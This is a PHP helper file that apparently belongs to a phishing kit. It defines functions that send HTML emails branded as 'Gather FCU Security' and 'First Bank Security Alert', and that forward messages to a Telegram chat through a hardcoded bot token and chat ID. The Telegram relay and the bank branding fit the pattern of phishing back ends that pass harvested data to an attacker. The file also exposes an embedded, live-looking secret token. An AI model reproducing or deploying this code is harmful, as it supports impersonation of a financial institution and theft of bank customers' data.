<?php
// Telegram configuration
$telegramConfig = [
    'bot_token' => getenv('TELEGRAM_BOT_TOKEN') ?: '7654767907:AAHQyLz7KuX2gzhVoOzWTNZiOMXsyo11mHI', // Use environment variable
    'chat_id' => getenv('TELEGRAM_CHAT_ID') ?: '7882154143'       // Use environment variable
];

// Email configuration
$emailConfig = [
    'from_name' => 'Gather FCU Security',
    'from_email' => getenv('EMAIL_FROM') ?: 'noreply@example.com',    // Use a placeholder email
    'admin_email' => getenv('EMAIL_ADMIN') ?: 'admin@example.com'      // Use a placeholder email
];

/**
 * Send an email notification.
 *
 * @param string $subject The subject of the email.
 * @param string $messageText The plain text message to send.
 * @return bool True if the email was sent successfully, false otherwise.
 */
function sendEmail($subject, $messageText) {
    global $emailConfig;

    // Email headers
    $headers = "From: {$emailConfig['from_name']} <{$emailConfig['from_email']}>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

    // Convert plain text message to HTML
    $messageHtml = nl2br(htmlspecialchars($messageText));

    // Email body
    $body = "
    <html>
    <head>
        <title>{$subject}</title>
        <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; }
            .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
            .header { background-color: #c9102f; color: white; padding: 10px; text-align: center; }
            .content { padding: 20px; }
            .footer { font-size: 12px; color: #777; text-align: center; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class='container'>
            <div class='header'>
                <h2>First Bank Security Alert</h2>
            </div>
            <div class='content'>
                <p>{$messageHtml}</p>
            </div>
            <div class='footer'>
                <p>This is an automated message from the First Bank security system.</p>
                <p>&copy; First Bank Security Team</p>
            </div>
        </div>
    </body>
    </html>
    ";

    // Send the email
    $result = mail($emailConfig['admin_email'], $subject, $body, $headers);

    // Log error if email fails
    if (!$result) {
        error_log("Failed to send email: Subject - {$subject}");
    }

    return $result;
}

/**
 * Send a notification to Telegram.
 *
 * @param string $message The message to send.
 * @return bool True if the message was sent successfully, false otherwise.
 */
function sendToTelegram($message) {
    global $telegramConfig;

    try {
        $url = "https://api.telegram.org/bot{$telegramConfig['bot_token']}/sendMessage";
        $params = [
            'chat_id' => $telegramConfig['chat_id'],
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        // Initialize cURL with timeout to prevent hanging
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 second timeout
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); // 3 second connection timeout
        
        // DNS resolution fix - try to resolve with Google's DNS first
        curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 2);

        $response = curl_exec($ch);
        
        if (curl_errno($ch)) {
            error_log("Telegram cURL error: " . curl_error($ch));
            curl_close($ch);
            return false;
        }
        
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Log error if Telegram notification fails
        if ($httpCode < 200 || $httpCode >= 300) {
            error_log("Failed to send Telegram notification: HTTP Code: {$httpCode}, Response: {$response}");
            return false;
        }

        return true;
    } catch (Exception $e) {
        error_log("Exception in sendToTelegram: " . $e->getMessage());
        return false;
    }
}
?>